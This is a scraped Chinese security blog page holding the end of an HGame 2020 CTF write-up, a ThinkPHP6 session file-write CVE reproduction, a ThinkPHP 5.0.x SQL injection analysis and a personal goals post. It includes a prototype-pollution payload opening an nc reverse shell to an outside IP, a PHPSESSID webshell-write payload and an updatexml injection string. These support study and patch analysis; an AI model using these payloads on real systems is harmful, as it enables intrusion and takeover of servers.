-Cookie: session=s%3A1PZpvTS3HgeMcmNynPUdu4Yd8B4A7Rlt.c2nTB%2F99oXNjyJljMJ0HZugi0SJnsE4juq2ZboRTH0g
-Connection: close
-
-{&quot;solution&quot;:123,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc 39.108.164.219 60000 -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p>content-type要设置成<code>Content-Type: application/json</code></p>
-<p>不然<code>__proto__</code>是无法当初键的,那么merge也就没用了</p>
-<p><code>hgame{j@v4scr1pt_pr0t0tYp3-poLLut1on_4tt4ck_1s_d@ng3r20us}</code></p>
-<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="欢迎参加HGame！"><a href="#欢迎参加HGame！" class="headerlink" title="欢迎参加HGame！"></a>欢迎参加HGame！</h3><p> <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a> </p>
-<h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>就说说咋拿到密码的</p>
-<p>压缩文件提示<code>End of Zip archive, comment: &quot;Password is picture ID.&quot;</code></p>
-<p>利用搜索引擎(<code>Pixiv@純白可憐</code>)拿到密码</p>
-<h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>解压得到一个文本和一个压缩包</p>
-<p>观察文本和压缩包发现,二者的CRC值相同,于是考虑用明文攻击(不好意思,我是看着wiki遍历过去的)</p>
-<p>然后拿到里面的word文档,但是是加密的,猝.</p>
-<p>在看一下那个文本,有点像培根密码</p>
-<pre><code class="python">s=&quot;of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.&quot;.replace(&quot; &quot;,&quot;&quot;)[:-1]
-result=&quot;&quot;
-for i in range(0,len(s),5):
-    temp=&quot;&quot;
-    for j in range(5):
-        if s[i+j]==s[i+j].lower():
-            temp+=&quot;0&quot;
-        else :
-            temp+=&quot;1&quot;
-    result+=chr(int(temp,2)+ord(&#39;A&#39;))
-print(result)</code></pre>
-<p>于是拿到密码(HIDDENINTHEDOC),但是还没到头!!!!!百度一下word隐写,最后拿到flag</p>
-<h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p>解压得到password.txt和ok.zip</p>
-<p>根据password.txt的提示,栅栏解密+凯撒密码得到压缩包密码.</p>
-<p>拿到一堆ook直接上谷歌.ok了</p>
-<p>base32-&gt;base64-&gt;二维码</p>
-<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>直接套脚本</p>
-<h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><pre><code class="python">#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-import gmpy2
-from secret import A, B, flag
-assert flag.startswith(&#39;hgame{&#39;) and flag.endswith(&#39;}&#39;)
-
-TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
-MOD = len(TABLE)
-
-cipher = &#39;&#39;
-for b in flag:
-    i = TABLE.find(b)
-    if i == -1:
-        cipher += b
-    else:
-        ii = (A*i + B) % MOD
-        cipher += TABLE[ii]
-
-print(cipher)
-# A8I5z{xr1A_J7ha_vG_TpH410}</code></pre>
-<p>我们观察可以发现这其实是个单表替换加密</p>
-<p>那么我们只要生成生成一个加密表就可以很容易的求出加密内容</p>
-<p>但是唯一麻烦的是我们不知道A,B,但是我们知道明文的前几个字符hgame</p>
-<p>于是有</p>
-<pre><code class="python">TABLE = &#39;zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM&#39;
-MOD = len(TABLE)
-cipher=&quot;A8I5z{xr1A_J7ha_vG_TpH410}&quot;
-
-for A in range(1,MOD):
-    for B in range(1,MOD):
-        result=&quot;&quot;
-        try :
-            #生成加密表
-            TABLE2={}
-            for b in TABLE:
-                i=TABLE.find(b)
-                TABLE2[TABLE[(A*i + B) % MOD]]=b
-            #解密
-            for b in cipher:
-                ii=TABLE.find(b)
-
-                if ii==-1:
-                    result+=b
-                else :
-                    result+=TABLE2[b]
-        except :
-            pass
-        if &quot;hgame&quot; in result:
-            print(result)
-</code></pre>
-<h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p>这个是位置移动加密,输入一个和flag长度相同的字符串就知道如何解密了</p>
-<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Hard-AAAAA"><a href="#Hard-AAAAA" class="headerlink" title="Hard_AAAAA"></a>Hard_AAAAA</h3><p>覆盖变量值来执行后门函数</p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/07/2020hgame/">http://blog.ccreater.top/2020/02/07/2020hgame/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/07/2020hgame/" data-id="ck917a7ba000wu8v0b029edz2" data-title="2020hgame" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-ThinkPHP6 任意文件操作漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2020-02-01T09:08:34.153Z" itemprop="datePublished">2020-02-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP6 任意文件操作漏洞分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP6-任意文件操作漏洞分析"><a href="#ThinkPHP6-任意文件操作漏洞分析" class="headerlink" title="ThinkPHP6 任意文件操作漏洞分析"></a>ThinkPHP6 任意文件操作漏洞分析</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ol>
-<li>ThinkPHP6.0.0-6.0.1</li>
-<li>开启Sessoin中间件</li>
-</ol>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>官方commit: <a href="https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2</a> </p>
-<p>复现环境为:phpstudy+thinkphp6.0.1</p>
-<p><code>\app\controller\index.php</code>:</p>
-<pre><code class="php">&lt;?php
-namespace app\controller;
-
-use app\BaseController;
-use think\facade\Session;
-class Index extends BaseController
-{
-    public function index($name)
-    {
-        Session::set(&#39;name&#39;, $name);
-        return &#39;hello,&#39; . Session::get(&#39;name&#39;);;
-    }
-
-}</code></pre>
-<p><code>\app\middleware.php</code></p>
-<pre><code class="php">&lt;?php
-// 全局中间件定义文件
-return [
-    // 全局请求缓存
-    // \think\middleware\CheckRequestCache::class,
-    // 多语言加载
-    // \think\middleware\LoadLangPack::class,
-//     Session初始化
-     \think\middleware\SessionInit::class
-];</code></pre>
-<p>根据漏洞的信息(任意文件操作),我们从<code>vendor\topthink\framework\src\think\session\Store.php</code> 的<code>save</code>函数开始进行分析</p>
-<pre><code class="php">public function save(): void
-    {
-        $this-&gt;clearFlashData();//清除原来的数据
-
-        $sessionId = $this-&gt;getId();
-
-        if (!empty($this-&gt;data)) {
-            $data = $this-&gt;serialize($this-&gt;data);
-
-            $this-&gt;handler-&gt;write($sessionId, $data);
-        } else {
-            $this-&gt;handler-&gt;delete($sessionId);
-        }
-
-        $this-&gt;init = false;
-    }</code></pre>
-<p>跟进<code>$this-&gt;handler-&gt;write</code>方法看一下</p>
-<pre><code class="php">public function write(string $sessID, string $sessData): bool
-    {
-        $filename = $this-&gt;getFileName($sessID, true);
-        $data     = $sessData;
-
-        if ($this-&gt;config[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) {
-            //数据压缩
-            $data = gzcompress($data, 3);
-        }
-
-        return $this-&gt;writeFile($filename, $data);
-    }</code></pre>
-<p>再跟进<code>$this-&gt;writeFile</code></p>
-<pre><code class="php">protected function writeFile($path, $content): bool
-    {
-        return (bool) file_put_contents($path, $content, LOCK_EX);
-    }</code></pre>
-<p>因为<code>$data</code>可控,那么我们只要能控制<code>$path</code>我们就可以写shell进去了</p>
-<p>而<code>$path</code>由<code>$this-&gt;getFileName($sessID, true);</code>得到</p>
-<p>跟进去</p>
-<pre><code class="php">    protected function getFileName(string $name, bool $auto = false): string
-    {
-        if ($this-&gt;config[&#39;prefix&#39;]) {
-            // 使用子目录
-            $name = $this-&gt;config[&#39;prefix&#39;] . DIRECTORY_SEPARATOR . &#39;sess_&#39; . $name;
-        } else {
-            $name = &#39;sess_&#39; . $name;
-        }
-
-        $filename = $this-&gt;config[&#39;path&#39;] . $name;
-        $dir      = dirname($filename);
-
-        if ($auto &amp;&amp; !is_dir($dir)) {
-            try {
-                mkdir($dir, 0755, true);
-            } catch (\Exception $e) {
-                // 创建失败
-            }
-        }
-
-        return $filename;
-    }</code></pre>
-<p><code>$filename</code>直接由末端拼接参数<code>$name</code></p>
-<p>而<code>write</code>调用<code>getFileName</code>时直接将参数<code>$sessID</code>传入,<code>$sessID</code>由<code>$sessionId = $this-&gt;getId();</code>获得</p>
-<pre><code class="php">    public function getId(): string
-    {
-        return $this-&gt;id;
-    }</code></pre>
-<p><code>$this-&gt;id</code>时通过<code>setId()</code>来设置的</p>
-<pre><code class="php">    public function setId($id = null): void
-    {
-        $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 ? $id : md5(microtime(true) . session_create_id());
-    }</code></pre>
-<p>如果<code>is_string($id) &amp;&amp; strlen($id) === 32</code>满足,则直接将<code>$id</code>的值赋给<code>$this-&gt;id</code></p>
-<p>查找调用setId的函数</p>
-<p><img src="https://i.loli.net/2020/02/01/cAes3Wot8BFbkjP.png" alt="image3070"></p>
-<p>其中<code>SessionInit</code></p>
-<pre><code class="php">    public function handle($request, Closure $next)
-    {
-        // Session初始化
-        $varSessionId = $this-&gt;app-&gt;config-&gt;get(&#39;session.var_session_id&#39;);
-        $cookieName   = $this-&gt;session-&gt;getName();
-
-        if ($varSessionId &amp;&amp; $request-&gt;request($varSessionId)) {
-            $sessionId = $request-&gt;request($varSessionId);
-        } else {
-            $sessionId = $request-&gt;cookie($cookieName);
-        }
-
-        if ($sessionId) {
-            $this-&gt;session-&gt;setId($sessionId);
-        }
-    }</code></pre>
-<p>查找配置发现<code>$sessionId</code>=&gt;<code>$_COOKIE[&#39;PHPSESSID&#39;]</code></p>
-<p>因此构造payload</p>
-<pre><code>http://127.0.0.1/tp/public/index.php?s=/index/index/&amp;name=%3C?php%20phpinfo();?%3E
-
-Cookie :PHPSESSID=9f7777c08f3909751b148338ba08.php
-
-访问http://127.0.0.1/tp/runtime/session/sess_9f7777c08f3909751b148338ba08.php</code></pre><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><pre><code class="php">public function setId($id=null):void
-{
-    $this-&gt;id = is_string($id) &amp;&amp; strlen($id) === 32 &amp;&amp; ctype_alnum($id) ? $id : md5(microtime(true) . session_create_id());
-}</code></pre>
-<p>在<code>setId</code>中增加了对<code>$id</code>的校验:<code>ctype_alnum($id)</code>,只允许数字或字母,来避免任意文件操作</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://paper.seebug.org/1114/#_1" target="_blank" rel="noopener">https://paper.seebug.org/1114/#_1</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/](<a href="http://blog.ccreater.top/2020/02/01/ThinkPHP6">http://blog.ccreater.top/2020/02/01/ThinkPHP6</a> 任意文件操作漏洞分析/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck917a7av000au8v0c62uatub" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
-  <time class="dt-published" datetime="2020-02-01T04:53:15.310Z" itemprop="datePublished">2020-02-01</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
-<p><code>application/index/controller/index.php</code>内容如下</p>
-<pre><code class="php">&lt;?php
-namespace app\index\controller;
-
-use app\model\Gather;
-
-class Index
-{
-    public function index()
-    {
-        $ids = input(&#39;ids/a&#39;);
-        $t = db(&quot;user&quot;);
-        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();
-
-    }
-}
-</code></pre>
-<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
-<p>调用堆栈为:</p>
-<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
-<p>从index()方法开始</p>
-<pre><code class="php">public function index()
-    {
-        $ids = input(&#39;ids/a&#39;);
-        $t = db(&quot;user&quot;);
-        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();
-
-    }</code></pre>
-<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
-<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
-<pre><code class="php">public function select($data = null)
-    {
-        ...
-
-        // 分析查询表达式
-        $options = $this-&gt;parseExpress();
-
-        ...
-        if (!$resultSet) {
-            // 生成查询SQL
-            $sql = $this-&gt;builder-&gt;select($options);
-            // 获取参数绑定
-            ...
-            }
-
-            ...
-
-    }</code></pre>
-<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
-<pre><code class="php">protected function parseExpress()
-    {
-        $options = $this-&gt;options;
-        ...
-    }</code></pre>
-<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
-<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
-<p>获得<code>$option</code>的调用链为:</p>
-<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
-<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
-<p>跟进去</p>
-<pre><code class="php">public function select($options = [])
-    {
-        $sql = str_replace(
-            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],
-            [
-                $this-&gt;parseTable($options[&#39;table&#39;], $options),
-                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),
-                $this-&gt;parseField($options[&#39;field&#39;], $options),
-                $this-&gt;parseJoin($options[&#39;join&#39;], $options),
-                $this-&gt;parseWhere($options[&#39;where&#39;], $options),
-                $this-&gt;parseGroup($options[&#39;group&#39;]),
-                $this-&gt;parseHaving($options[&#39;having&#39;]),
-                $this-&gt;parseOrder($options[&#39;order&#39;], $options),
-                $this-&gt;parseLimit($options[&#39;limit&#39;]),
-                $this-&gt;parseUnion($options[&#39;union&#39;]),
-                $this-&gt;parseLock($options[&#39;lock&#39;]),
-                $this-&gt;parseComment($options[&#39;comment&#39;]),
-                $this-&gt;parseForce($options[&#39;force&#39;]),
-            ], $this-&gt;selectSql);
-        return $sql;
-    }</code></pre>
-<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
-<pre><code class="php">protected function parseWhere($where, $options)
-    {
-        $whereStr = $this-&gt;buildWhere($where, $options);
-        ...
-        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
-    }</code></pre>
-<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
-<pre><code class="php">public function buildWhere($where, $options)
-    {
-        if (empty($where)) {
-            $where = [];
-        }
-
-        if ($where instanceof Query) {
-            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);
-        }
-
-        $whereStr = &#39;&#39;;
-        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
-        foreach ($where as $key =&gt; $val) {
-            $str = [];
-            foreach ($val as $field =&gt; $value) {
-                ...
-                    // 对字段使用表达式查询
-                    $field = is_string($field) ? $field : &#39;&#39;;
-                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
-
-            }
-
-            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);
-        }
-
-        return $whereStr;
-    }</code></pre>
-<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
-<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
-<pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)
-    {
-        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;
-
-        // 查询规则和条件
-        if (!is_array($val)) {
-            $val = [&#39;=&#39;, $val];
-        }
-        list($exp, $value) = $val;
-        // 字段分析
-        if(....){
-            ...
-        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {
-            // IN 查询
-            if ($value instanceof \Closure) {
-                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
-            } else {
-                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
-                if (array_key_exists($field, $binds)) {
-                    $bind  = [];
-                    $array = [];
-                    foreach ($value as $k =&gt; $v) {
-                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
-                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
-                        } else {
-                            $bindKey = $bindName . &#39;_in_&#39; . $k;
-                        }
-                        $bind[$bindKey] = [$v, $bindType];
-                        $array[]        = &#39;:&#39; . $bindKey;
-                    }
-                    $this-&gt;query-&gt;bind($bind);
-                    $zone = implode(&#39;,&#39;, $array);
-                } else {
-                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
-                }
-                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
-            }
-        } 
-        return $whereStr;
-    }</code></pre>
-<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
-<pre><code class="php">                foreach ($value as $k =&gt; $v) {
-                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
-                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
-                        } else {
-                            $bindKey = $bindName . &#39;_in_&#39; . $k;
-                        }
-                        $bind[$bindKey] = [$v, $bindType];
-                        $array[]        = &#39;:&#39; . $bindKey;
-                    }</code></pre>
-<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
-<p>但是这里只能进行没有子查询语句的sql报错注入</p>
-<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
-<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
-<p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="ck917a7b9000tu8v0hlul7ymn" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/01/31/%E6%88%91%E7%9A%842020/" class="article-date">
-  <time class="dt-published" datetime="2020-01-31T15:11:23.717Z" itemprop="datePublished">2020-01-31</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/01/31/%E6%88%91%E7%9A%842020/">我的2020</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
-<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
-<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
-<p>我想要变得更加优秀,我想活出自己</p>
-<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
-<li>目标是清晰明确的,量化的</li>
-<li>目标难度要适合,不能太简单也不能不可实现</li>
-<li>如果无法确定今年的目标,那就确定这个月的吧</li>
-<li>根据实际情况对目标进行调整</li>
-<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
-</ol>
-<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
-<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
-<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
-<li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
-<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
-<li>小目标永远是为大目标/梦想/想法服务的</li>
-</ol>
-<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
-<li>分解细致，能力可达，留有余地</li>
-<li>奖惩并行</li>
-<li>每个星期总结一次,计划是否合理</li>
-</ol>
-<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
-<li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li>
-<li>身体健康,三观尚在 </li>
-<li>开发一个类似hexo的python程序</li>
-<li>进入补天前1000名</li>
-</ol>
